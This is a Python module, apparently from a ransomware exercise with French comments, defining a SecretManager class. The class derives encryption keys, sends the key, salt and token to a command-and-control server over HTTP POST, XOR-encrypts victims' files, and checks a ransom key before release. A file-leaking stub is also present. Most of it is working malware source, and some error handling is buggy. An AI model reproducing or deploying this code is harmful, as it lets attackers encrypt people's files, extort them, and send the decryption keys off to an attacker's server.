from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64
import shutil # pour remove le directory token_data

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:

        # Fonction de dérivation de la clé
        key_derivate_function = PBKDF2HMAC(
            algorithm   = hashes.SHA256(),
            length      = self.KEY_LENGTH,
            salt        = salt,
            iterations  = self.ITERATION
        )

        # Dérivation de la clé
        derivate_key = key_derivate_function.derive(key)
        return derivate_key


    def create(self)->Tuple[bytes, bytes, bytes]:

        # Génération de la clé
        key = secrets.token_bytes(self.KEY_LENGTH)

        # Génération du sel
        salt = secrets.token_bytes(self.SALT_LENGTH)

        # Génération du token
        token = self.do_derivation(salt, key)

        return (key, salt, token)

    def bin_to_b64(self, data:bytes)->str:

        # Encodage de data en base 64
        data_base64 = base64.b64encode(data)

        # Retourne data_base64 en string 
        return str(data_base64, "utf8") 

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:

        # URL à laquelle on envoie le token , le salt et la key
        # le ?nufnuf=cochon permet de ne pas avoir de message d'erreur dans le terminal du cnc
        url = f"http://{self._remote_host_port}/new?nufnuf=cochon" 

        data = {
            "token" : self.bin_to_b64(token),
            "salt" : self.bin_to_b64(salt),
            "key" : self.bin_to_b64(key)
        }

        # Requête POST
        reponse = requests.post(url, json=data)

        # Vérification de la bonne réception du message
        if reponse.status_code == 200:
            self._log.info(f"data successfully sent to {url}")
        else:
            self._log.error("Error, POST request failed")


    def setup(self)->None:

        # Génération des valeurs cryptographiques
        (self._key, self._salt, self._token) = self.create()

        # Création du dossier si nécessaire
        os.makedirs(self._path, exist_ok=True)
        
        # Génération du chemin de salt.bin
        chemin_pour_salt_dot_bin = os.path.join(self._path, "salt.bin")
        # Génération du chemin de token.bin
        chemin_pour_token_dot_bin = os.path.join(self._path, "token.bin")

        # Vérification de la non-existance de salt.bin
        if(os.path.exists(chemin_pour_salt_dot_bin)):
            raise FileExistsError("salt.bin already exists")
        
        # Vérification de la non-existance de token.bin
        if(os.path.exists(chemin_pour_token_dot_bin)):
            raise FileExistsError("token.bin already exists")

        # Ecriture du fichier salt.bin
        fichier_salt_dot_bin = open(chemin_pour_salt_dot_bin, "wb") 
        fichier_salt_dot_bin.write(self._salt)
        fichier_salt_dot_bin.close()

        # Ecriture du fichier token.bin 
        chemin_pour_token_dot_bin = open(chemin_pour_token_dot_bin, "wb") 
        chemin_pour_token_dot_bin.write(self._token)
        chemin_pour_token_dot_bin.close()

        # Envoi des données au CNC
        self.post_new(salt  = self._salt,
                      key   = self._key,
                      token = self._token)


    def load(self)->None:
        
        # Chemin du fichier salt.bin
        salt_path = os.path.join(self._path, "salt.bin")
        
        try:

            # Ouverture du fichier en mode lecture binaire
            salt_file = open(salt_path, "rb")
            # Lecture du fichier
            self._salt = salt_file.read()
            # Fermeture du fichier
            salt_file.close()

        except FileNotFoundError as e:
            raise e("Error while reading salt.bin file") 
        
        # Chemin du fichier key.bin
        token_path = os.path.join(self._path, "token.bin")
        
        try:
            # Ouverture du fichier en mode lecture binaire
            token_file = open(token_path, "rb")
            # Lecture du fichier
            self._token = token_file.read()
            # Fermeture du fichier
            token_file.close()

        except FileNotFoundError as e:
            raise e("Error while reading token.bin file") 
        
        
            

    def check_key(self, candidate_key:bytes)->bool:

        # Dérivation de la clé candidate
        token_tmp = self.do_derivation(self._salt, candidate_key)
        return token_tmp == self._token

    def set_key(self, b64_key:str)->None:
        
        # Décodage da la clé potentielle
        potential_key = base64.b64decode(b64_key)

        # Verficitaion de la clé potentielle
        if self.check_key(potential_key):
            self._key = potential_key
        else:
            raise ValueError("Wrong Key provided")


    def get_hex_token(self)->str:

        # Hashage du token 
        hash_token = sha256(self._token)

        # Transformation en string
        str_token = hash_token.hexdigest()
        return str_token
        

    def xorfiles(self, files:List[str])->None:
        # Pour chaque fichier, on le chiffre avec la clé
        for file in files:
            xorfile(file, self._key)


    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self)->None:

        # Su    ppresion du fichier salt.bin
        try:    
            salt_path = os.path.join(self._path, "salt.bin")
            if os.path.exists(salt_path):
                os.remove(salt_path)
                # self._log.info("The file salt.bin has been successfully deleted")
            else:
                self._log.error("The file salt.bin does not exist")
        except FileNotFoundError as e:
            raise e("Error while deleting salt.bin file")
        
        # Suppresion du fichier token.bin
        try:
            token_path = os.path.join(self._path, "token.bin")
            if os.path.exists(token_path):
                os.remove(token_path)
                # self._log.info("The file token.bin has been successfully deleted")
            else:
                self._log.error("The file token.bin does not exist")
        except FileNotFoundError as e:
            raise e("Error while deleting token.bin file")
        
        # try:
        #     if os.path.exists(self._path):
        #         os.rmdir(self._path)
        #         self._log.info("The directory token_data has been successfully deleted")
        #     else:
        #         self._log.error("The directory token_data does not exist")
        # except OSError as e:
        #     raise e("Error while deleting token_data directory")

        # Ce bloc ne fonctionne pas pour supprimer le dossier 'token', et j'ignore pourquoi ?